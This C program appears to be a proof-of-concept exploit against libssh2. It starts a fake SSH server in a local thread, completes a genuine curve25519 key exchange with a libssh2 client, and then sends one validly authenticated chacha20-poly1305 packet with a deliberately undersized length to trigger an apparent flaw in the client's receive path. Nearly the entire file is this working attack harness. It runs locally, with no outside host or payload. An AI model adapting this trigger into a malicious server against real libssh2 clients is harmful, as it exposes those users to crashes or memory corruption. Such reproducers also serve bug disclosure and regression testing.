/*
 * Drive libssh2's chacha20-poly1305 receive path with one authenticated
 * packet whose length is accepted by the transport (>= 4) but shorter
 * than a normal padded SSH packet.
 */
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include <openssl/evp.h>
#include <openssl/rand.h>

#include "libssh2.h"

#define SSH_MSG_KEXINIT 20
#define SSH_MSG_NEWKEYS 21
#define SSH_MSG_KEX_ECDH_INIT 30
#define SSH_MSG_KEX_ECDH_REPLY 31

#define BANNER "SSH-2.0-poc"

struct srv {
    int fd;
    unsigned pktlen;
    int rc;
    char err[256];
};

static void fail(struct srv *s, const char *msg)
{
    snprintf(s->err, sizeof(s->err), "%s", msg);
    s->rc = -1;
}

static int write_all(int fd, const unsigned char *buf, size_t len)
{
    size_t off = 0;

    while(off < len) {
        ssize_t n = write(fd, buf + off, len - off);

        if(n < 0) {
            if(errno == EINTR)
                continue;
            return -1;
        }
        if(n == 0)
            return -1;
        off += (size_t)n;
    }
    return 0;
}

static int read_all(int fd, unsigned char *buf, size_t len)
{
    size_t off = 0;

    while(off < len) {
        ssize_t n = read(fd, buf + off, len - off);

        if(n < 0) {
            if(errno == EINTR)
                continue;
            return -1;
        }
        if(n == 0)
            return -1;
        off += (size_t)n;
    }
    return 0;
}

static void put_u32(unsigned char *p, uint32_t v)
{
    p[0] = (unsigned char)(v >> 24);
    p[1] = (unsigned char)(v >> 16);
    p[2] = (unsigned char)(v >> 8);
    p[3] = (unsigned char)v;
}

static uint32_t get_u32(const unsigned char *p)
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

static int send_banner(int fd)
{
    char line[64];
    int n = snprintf(line, sizeof(line), "%s\r\n", BANNER);

    return write_all(fd, (unsigned char *)line, (size_t)n);
}

static int recv_banner(int fd, char *out, size_t outlen)
{
    size_t n = 0;

    while(n + 1 < outlen) {
        unsigned char c;

        if(read_all(fd, &c, 1))
            return -1;
        if(c == '\n')
            break;
        if(c == '\r')
            continue;
        out[n++] = (char)c;
    }
    out[n] = '\0';
    return n > 0 ? 0 : -1;
}

/* Unencrypted SSH binary packet, block size 8. */
static int send_plain(int fd, const unsigned char *payload, size_t payload_len)
{
    size_t packet_length = payload_len + 1 + 4;
    size_t padding = 8 - (packet_length % 8);
    unsigned char *buf;
    size_t total;

    if(padding < 4)
        padding += 8;
    packet_length += padding;
    total = packet_length;
    buf = calloc(1, total);
    if(!buf)
        return -1;
    put_u32(buf, (uint32_t)(packet_length - 4));
    buf[4] = (unsigned char)padding;
    memcpy(buf + 5, payload, payload_len);
    if(RAND_bytes(buf + 5 + payload_len, (int)padding) != 1) {
        free(buf);
        return -1;
    }
    if(write_all(fd, buf, total)) {
        free(buf);
        return -1;
    }
    free(buf);
    return 0;
}

static int recv_plain(int fd, unsigned char **payload, size_t *payload_len)
{
    unsigned char lenb[4];
    uint32_t len;
    unsigned char *body;
    unsigned pad;

    if(read_all(fd, lenb, 4))
        return -1;
    len = get_u32(lenb);
    if(len < 1 || len > 35000)
        return -1;
    body = malloc(len);
    if(!body)
        return -1;
    if(read_all(fd, body, len)) {
        free(body);
        return -1;
    }
    pad = body[0];
    if(pad + 1 > len) {
        free(body);
        return -1;
    }
    *payload_len = len - 1 - pad;
    *payload = malloc(*payload_len);
    if(!*payload) {
        free(body);
        return -1;
    }
    memcpy(*payload, body + 1, *payload_len);
    free(body);
    return 0;
}

static int append_namelist(unsigned char *buf, size_t *off, const char *names)
{
    size_t n = strlen(names);

    if(*off + 4 + n > 4096)
        return -1;
    put_u32(buf + *off, (uint32_t)n);
    memcpy(buf + *off + 4, names, n);
    *off += 4 + n;
    return 0;
}

static int build_kexinit(unsigned char *buf, size_t *len)
{
    size_t off = 0;

    buf[off++] = SSH_MSG_KEXINIT;
    if(RAND_bytes(buf + off, 16) != 1)
        return -1;
    off += 16;
    if(append_namelist(buf, &off, "curve25519-sha256") ||
       append_namelist(buf, &off, "ssh-ed25519") ||
       append_namelist(buf, &off, "chacha20-poly1305@openssh.com") ||
       append_namelist(buf, &off, "chacha20-poly1305@openssh.com") ||
       append_namelist(buf, &off, "hmac-sha2-256") ||
       append_namelist(buf, &off, "hmac-sha2-256") ||
       append_namelist(buf, &off, "none") ||
       append_namelist(buf, &off, "none") ||
       append_namelist(buf, &off, "") ||
       append_namelist(buf, &off, ""))
        return -1;
    buf[off++] = 0;
    put_u32(buf + off, 0);
    off += 4;
    *len = off;
    return 0;
}

static void hash_str(EVP_MD_CTX *md, const void *p, size_t n)
{
    unsigned char lb[4];

    put_u32(lb, (uint32_t)n);
    EVP_DigestUpdate(md, lb, 4);
    if(n)
        EVP_DigestUpdate(md, p, n);
}

static int mpint_encode(const unsigned char *raw, size_t rawlen,
                        unsigned char *out, size_t *outlen)
{
    size_t i = 0;
    int pad;
    size_t n;

    while(i + 1 < rawlen && raw[i] == 0)
        i++;
    raw += i;
    rawlen -= i;
    pad = (raw[0] & 0x80) ? 1 : 0;
    n = 4 + pad + rawlen;
    if(n > *outlen)
        return -1;
    put_u32(out, (uint32_t)(pad + rawlen));
    if(pad)
        out[4] = 0;
    memcpy(out + 4 + pad, raw, rawlen);
    *outlen = n;
    return 0;
}

static int x25519_gen(EVP_PKEY **pkey, unsigned char pub[32])
{
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_X25519, NULL);
    size_t publen = 32;

    if(!ctx)
        return -1;
    if(EVP_PKEY_keygen_init(ctx) <= 0 || EVP_PKEY_keygen(ctx, pkey) <= 0) {
        EVP_PKEY_CTX_free(ctx);
        return -1;
    }
    EVP_PKEY_CTX_free(ctx);
    if(EVP_PKEY_get_raw_public_key(*pkey, pub, &publen) <= 0 || publen != 32)
        return -1;
    return 0;
}

static int x25519_shared(EVP_PKEY *ours, const unsigned char peer[32],
                         unsigned char out[32])
{
    EVP_PKEY *peer_key = EVP_PKEY_new_raw_public_key(EVP_PKEY_X25519, NULL,
                                                     peer, 32);
    EVP_PKEY_CTX *ctx;
    size_t outlen = 32;
    int rc = -1;

    if(!peer_key)
        return -1;
    ctx = EVP_PKEY_CTX_new(ours, NULL);
    if(!ctx)
        goto done;
    if(EVP_PKEY_derive_init(ctx) <= 0)
        goto done;
    if(EVP_PKEY_derive_set_peer(ctx, peer_key) <= 0)
        goto done;
    if(EVP_PKEY_derive(ctx, out, &outlen) <= 0 || outlen != 32)
        goto done;
    rc = 0;
done:
    EVP_PKEY_CTX_free(ctx);
    EVP_PKEY_free(peer_key);
    return rc;
}

static int ed25519_gen(EVP_PKEY **pkey, unsigned char pub[32])
{
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_ED25519, NULL);
    size_t publen = 32;

    if(!ctx)
        return -1;
    if(EVP_PKEY_keygen_init(ctx) <= 0 || EVP_PKEY_keygen(ctx, pkey) <= 0) {
        EVP_PKEY_CTX_free(ctx);
        return -1;
    }
    EVP_PKEY_CTX_free(ctx);
    if(EVP_PKEY_get_raw_public_key(*pkey, pub, &publen) <= 0 || publen != 32)
        return -1;
    return 0;
}

static int ed25519_sign(EVP_PKEY *pkey, const unsigned char *msg, size_t msglen,
                        unsigned char sig[64])
{
    EVP_MD_CTX *md = EVP_MD_CTX_new();
    size_t siglen = 64;
    int rc;

    if(!md)
        return -1;
    rc = EVP_DigestSignInit(md, NULL, NULL, NULL, pkey);
    if(rc == 1)
        rc = EVP_DigestSign(md, sig, &siglen, msg, msglen);
    EVP_MD_CTX_free(md);
    return (rc == 1 && siglen == 64) ? 0 : -1;
}

static int chacha20_xor(const unsigned char key[32], const unsigned char nonce[8],
                        uint64_t counter, unsigned char *out,
                        const unsigned char *in, size_t len)
{
    unsigned char iv[16];
    EVP_CIPHER_CTX *ctx;
    int outl = 0;
    int rc;
    int i;

    for(i = 0; i < 8; i++)
        iv[i] = (unsigned char)((counter >> (8 * i)) & 0xff);
    memcpy(iv + 8, nonce, 8);
    ctx = EVP_CIPHER_CTX_new();
    if(!ctx)
        return -1;
    rc = EVP_EncryptInit_ex(ctx, EVP_chacha20(), NULL, key, iv);
    if(rc == 1)
        rc = EVP_CIPHER_CTX_set_padding(ctx, 0);
    if(rc == 1)
        rc = EVP_EncryptUpdate(ctx, out, &outl, in, (int)len);
    EVP_CIPHER_CTX_free(ctx);
    return (rc == 1 && outl == (int)len) ? 0 : -1;
}

static int poly1305_tag(const unsigned char key[32], const unsigned char *m,
                        size_t len, unsigned char tag[16])
{
    EVP_MAC *mac = EVP_MAC_fetch(NULL, "POLY1305", NULL);
    EVP_MAC_CTX *ctx;
    size_t outl = 16;
    int rc = -1;

    if(!mac)
        return -1;
    ctx = EVP_MAC_CTX_new(mac);
    if(!ctx)
        goto done;
    if(EVP_MAC_init(ctx, key, 32, NULL) != 1)
        goto done;
    if(EVP_MAC_update(ctx, m, len) != 1)
        goto done;
    if(EVP_MAC_final(ctx, tag, &outl, 16) != 1 || outl != 16)
        goto done;
    rc = 0;
done:
    EVP_MAC_CTX_free(ctx);
    EVP_MAC_free(mac);
    return rc;
}

static void seq_nonce(unsigned char nonce[8], uint32_t seq)
{
    int i;

    memset(nonce, 0, 8);
    for(i = 7; i >= 0; i--) {
        nonce[i] = (unsigned char)(seq & 0xff);
        seq >>= 8;
    }
}

/* OpenSSH/libssh2 chacha20-poly1305 packet. seq is the packet sequence.
   pktlen 0 builds a real SSH_MSG_SERVICE_ACCEPT (length 24). */
static int send_chacha_packet(int fd, const unsigned char key64[64],
                              uint32_t seq, uint32_t pktlen)
{
    unsigned char nonce[8];
    unsigned char polykey[32];
    unsigned char zeros[32];
    unsigned char *plain;
    unsigned char *cipher;
    unsigned char tag[16];
    const unsigned char *main_key = key64;
    const unsigned char *header_key = key64 + 32;
    size_t wire;
    int valid_accept = 0;

    if(pktlen == 0) {
        valid_accept = 1;
        pktlen = 24;
    }
    if(pktlen < 1 || pktlen > 64)
        return -1;
    plain = calloc(1, 4 + pktlen);
    cipher = calloc(1, 4 + pktlen);
    if(!plain || !cipher) {
        free(plain);
        free(cipher);
        return -1;
    }
    put_u32(plain, pktlen);
    if(valid_accept) {
        /* padlen || SSH_MSG_SERVICE_ACCEPT || "ssh-userauth" || padding */
        plain[4] = 6;
        plain[5] = 6; /* SSH_MSG_SERVICE_ACCEPT */
        put_u32(plain + 6, 12);
        memcpy(plain + 10, "ssh-userauth", 12);
    }
    else if(pktlen > 1)
        plain[4] = (unsigned char)(pktlen - 1 > 4 ? 4 : pktlen - 1);

    seq_nonce(nonce, seq);
    memset(zeros, 0, sizeof(zeros));
    memset(polykey, 0, sizeof(polykey));
    if(chacha20_xor(main_key, nonce, 0, polykey, zeros, 32))
        goto bad;
    if(chacha20_xor(header_key, nonce, 0, cipher, plain, 4))
        goto bad;
    if(chacha20_xor(main_key, nonce, 1, cipher + 4, plain + 4, pktlen))
        goto bad;
    if(poly1305_tag(polykey, cipher, 4 + pktlen, tag))
        goto bad;

    wire = 4 + pktlen + 16;
    if(write_all(fd, cipher, 4 + pktlen) || write_all(fd, tag, 16))
        goto bad;
    free(plain);
    free(cipher);
    (void)wire;
    return 0;
bad:
    free(plain);
    free(cipher);
    return -1;
}

static int derive_key(const unsigned char *k, size_t klen,
                      const unsigned char h[32], const unsigned char sid[32],
                      char letter, unsigned char out[64])
{
    unsigned char block[32];
    EVP_MD_CTX *md = EVP_MD_CTX_new();
    unsigned int blen = 0;

    if(!md)
        return -1;
    if(EVP_DigestInit_ex(md, EVP_sha256(), NULL) != 1)
        goto bad;
    EVP_DigestUpdate(md, k, klen);
    EVP_DigestUpdate(md, h, 32);
    EVP_DigestUpdate(md, &letter, 1);
    EVP_DigestUpdate(md, sid, 32);
    if(EVP_DigestFinal_ex(md, block, &blen) != 1 || blen != 32)
        goto bad;
    memcpy(out, block, 32);

    if(EVP_DigestInit_ex(md, EVP_sha256(), NULL) != 1)
        goto bad;
    EVP_DigestUpdate(md, k, klen);
    EVP_DigestUpdate(md, h, 32);
    EVP_DigestUpdate(md, out, 32);
    if(EVP_DigestFinal_ex(md, block, &blen) != 1 || blen != 32)
        goto bad;
    memcpy(out + 32, block, 32);
    EVP_MD_CTX_free(md);
    return 0;
bad:
    EVP_MD_CTX_free(md);
    return -1;
}

static void *server_main(void *arg)
{
    struct srv *s = arg;
    char client_banner[256];
    unsigned char kexinit[512];
    size_t kexinit_len = 0;
    unsigned char *client_kex = NULL;
    size_t client_kex_len = 0;
    unsigned char *init_pkt = NULL;
    size_t init_len = 0;
    unsigned char client_pub[32];
    unsigned char server_pub[32];
    unsigned char shared[32];
    unsigned char host_pub[32];
    unsigned char k_mpint[40];
    size_t k_len = sizeof(k_mpint);
    unsigned char hash[32];
    unsigned char sig[64];
    unsigned char hostblob[64];
    size_t hostblob_len;
    unsigned char sigblob[128];
    size_t sigblob_len;
    unsigned char reply[256];
    size_t reply_len;
    unsigned char *newkeys = NULL;
    size_t newkeys_len = 0;
    unsigned char one = SSH_MSG_NEWKEYS;
    unsigned char key_d[64];
    EVP_PKEY *eph = NULL;
    EVP_PKEY *host = NULL;
    EVP_MD_CTX *md = NULL;
    unsigned int hlen = 0;

    s->rc = -1;
    if(recv_banner(s->fd, client_banner, sizeof(client_banner))) {
        fail(s, "banner");
        return NULL;
    }
    if(send_banner(s->fd)) {
        fail(s, "send banner");
        return NULL;
    }
    if(recv_plain(s->fd, &client_kex, &client_kex_len)) {
        fail(s, "client kexinit");
        return NULL;
    }
    if(client_kex_len < 1 || client_kex[0] != SSH_MSG_KEXINIT) {
        fail(s, "kexinit type");
        goto out;
    }
    if(build_kexinit(kexinit, &kexinit_len) ||
       send_plain(s->fd, kexinit, kexinit_len)) {
        fail(s, "send kexinit");
        goto out;
    }
    if(recv_plain(s->fd, &init_pkt, &init_len)) {
        fail(s, "ecdh init");
        goto out;
    }
    if(init_len != 1 + 4 + 32 || init_pkt[0] != SSH_MSG_KEX_ECDH_INIT ||
       get_u32(init_pkt + 1) != 32) {
        fail(s, "ecdh init shape");
        goto out;
    }
    memcpy(client_pub, init_pkt + 5, 32);

    if(x25519_gen(&eph, server_pub) || x25519_shared(eph, client_pub, shared)) {
        fail(s, "x25519");
        goto out;
    }
    if(ed25519_gen(&host, host_pub)) {
        fail(s, "ed25519");
        goto out;
    }
    if(mpint_encode(shared, 32, k_mpint, &k_len)) {
        fail(s, "mpint");
        goto out;
    }

    hostblob_len = 0;
    put_u32(hostblob, 11);
    memcpy(hostblob + 4, "ssh-ed25519", 11);
    put_u32(hostblob + 15, 32);
    memcpy(hostblob + 19, host_pub, 32);
    hostblob_len = 51;

    md = EVP_MD_CTX_new();
    if(!md || EVP_DigestInit_ex(md, EVP_sha256(), NULL) != 1) {
        fail(s, "hash init");
        goto out;
    }
    hash_str(md, client_banner, strlen(client_banner));
    hash_str(md, BANNER, strlen(BANNER));
    hash_str(md, client_kex, client_kex_len);
    hash_str(md, kexinit, kexinit_len);
    hash_str(md, hostblob, hostblob_len);
    hash_str(md, client_pub, 32);
    hash_str(md, server_pub, 32);
    EVP_DigestUpdate(md, k_mpint, k_len);
    if(EVP_DigestFinal_ex(md, hash, &hlen) != 1 || hlen != 32) {
        fail(s, "hash final");
        goto out;
    }
    if(ed25519_sign(host, hash, 32, sig)) {
        fail(s, "sign");
        goto out;
    }

    put_u32(sigblob, 11);
    memcpy(sigblob + 4, "ssh-ed25519", 11);
    put_u32(sigblob + 15, 64);
    memcpy(sigblob + 19, sig, 64);
    sigblob_len = 83;

    reply[0] = SSH_MSG_KEX_ECDH_REPLY;
    reply_len = 1;
    put_u32(reply + reply_len, (uint32_t)hostblob_len);
    reply_len += 4;
    memcpy(reply + reply_len, hostblob, hostblob_len);
    reply_len += hostblob_len;
    put_u32(reply + reply_len, 32);
    reply_len += 4;
    memcpy(reply + reply_len, server_pub, 32);
    reply_len += 32;
    put_u32(reply + reply_len, (uint32_t)sigblob_len);
    reply_len += 4;
    memcpy(reply + reply_len, sigblob, sigblob_len);
    reply_len += sigblob_len;

    if(send_plain(s->fd, reply, reply_len)) {
        fail(s, "send reply");
        goto out;
    }
    if(recv_plain(s->fd, &newkeys, &newkeys_len)) {
        fail(s, "client newkeys");
        goto out;
    }
    if(newkeys_len != 1 || newkeys[0] != SSH_MSG_NEWKEYS) {
        fail(s, "newkeys type");
        goto out;
    }
    if(send_plain(s->fd, &one, 1)) {
        fail(s, "send newkeys");
        goto out;
    }

    /* Packet sequence: KEXINIT=0, ECDH_REPLY=1, NEWKEYS=2, next=3. */
    if(derive_key(k_mpint, k_len, hash, hash, 'D', key_d)) {
        fail(s, "derive");
        goto out;
    }
    if(send_chacha_packet(s->fd, key_d, 3, s->pktlen)) {
        fail(s, "send chacha");
        goto out;
    }
    s->rc = 0;
    s->err[0] = '\0';

out:
    EVP_MD_CTX_free(md);
    EVP_PKEY_free(eph);
    EVP_PKEY_free(host);
    free(client_kex);
    free(init_pkt);
    free(newkeys);
    return NULL;
}

int main(int argc, char **argv)
{
    int fds[2] = { -1, -1 };
    pthread_t thr;
    struct srv srv;
    LIBSSH2_SESSION *session = NULL;
    int rc;
    unsigned pktlen = 5;
    char *errmsg = NULL;

    if(argc > 1)
        pktlen = (unsigned)atoi(argv[1]);

    signal(SIGPIPE, SIG_IGN);
    alarm(20);

    if(socketpair(AF_UNIX, SOCK_STREAM, 0, fds)) {
        perror("socketpair");
        return 1;
    }

    memset(&srv, 0, sizeof(srv));
    srv.fd = fds[1];
    srv.pktlen = pktlen;
    if(pthread_create(&thr, NULL, server_main, &srv)) {
        perror("pthread_create");
        return 1;
    }

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init failed\n");
        return 1;
    }
    session = libssh2_session_init();
    if(!session)
        return 1;
    libssh2_session_set_blocking(session, 1);
    libssh2_session_method_pref(session, LIBSSH2_METHOD_KEX,
                                "curve25519-sha256");
    libssh2_session_method_pref(session, LIBSSH2_METHOD_HOSTKEY,
                                "ssh-ed25519");
    libssh2_session_method_pref(session, LIBSSH2_METHOD_CRYPT_CS,
                                "chacha20-poly1305@openssh.com");
    libssh2_session_method_pref(session, LIBSSH2_METHOD_CRYPT_SC,
                                "chacha20-poly1305@openssh.com");
    libssh2_session_method_pref(session, LIBSSH2_METHOD_MAC_CS,
                                "hmac-sha2-256");
    libssh2_session_method_pref(session, LIBSSH2_METHOD_MAC_SC,
                                "hmac-sha2-256");
    libssh2_session_method_pref(session, LIBSSH2_METHOD_COMP_CS, "none");
    libssh2_session_method_pref(session, LIBSSH2_METHOD_COMP_SC, "none");

    rc = libssh2_session_handshake(session, fds[0]);
    if(rc) {
        libssh2_session_last_error(session, &errmsg, NULL, 0);
        fprintf(stderr, "handshake rc=%d %s\n", rc, errmsg ? errmsg : "");
        fprintf(stderr, "server: %s\n", srv.err);
    }
    else {
        fprintf(stderr, "handshake ok\n");
    }

    libssh2_session_free(session);
    libssh2_exit();
    pthread_join(thr, NULL);
    close(fds[0]);
    close(fds[1]);
    return rc ? 1 : 0;
}
